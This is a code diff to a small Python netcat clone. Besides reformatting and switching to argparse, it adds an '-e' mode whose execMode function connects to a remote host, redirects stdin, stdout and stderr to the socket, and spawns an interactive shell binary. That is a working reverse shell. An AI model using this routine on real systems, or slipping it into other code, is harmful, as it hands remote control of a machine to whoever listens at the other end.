@@ -5,16 +5,17 @@ import sys
 
 import threading
 import time
+import argparse
 
 exitFlag = 0
 
 class myThread(threading.Thread):
-   def __init__(self, threadID, name):
-      threading.Thread.__init__(self,daemon=True)
-      self.threadID = threadID
-      self.name = name
-   def run(self):
-      sendLoop()
+    def __init__(self, threadID, name):
+        threading.Thread.__init__(self,daemon=True)
+        self.threadID = threadID
+        self.name = name
+    def run(self):
+         sendLoop()
 
 def receiveLoop():
     while True:
@@ -30,12 +31,25 @@ def sendLoop():
         myinput = input()
         sock.sendall(bytes(myinput+"\n",'utf-8'))
 
-def usage():
-    print("nc.py ADDRESS PORT")
+def execMode(host,port,binary):
+    import socket,subprocess,os
 
-if len(sys.argv)!=3:
-    usage()
-    sys.exit()
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((host,port))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call([binary,"-i"])
+
+parser = argparse.ArgumentParser(description="Simple nc in python")
+parser.add_argument('host', metavar='HOST', type=str, help='The destination host to connect to')
+parser.add_argument('port', metavar='PORT', type=int, help='The destination port to connect to')
+parser.add_argument('-e',dest='binary',default=None,help="Execute the following command interractively")
+
+args = parser.parse_args()
+
+if args.binary is not None:
+    execMode(args.host,args.port,args.binary)
 
 sock = socket.socket()
 sock.connect((sys.argv[1],int(sys.argv[2])))
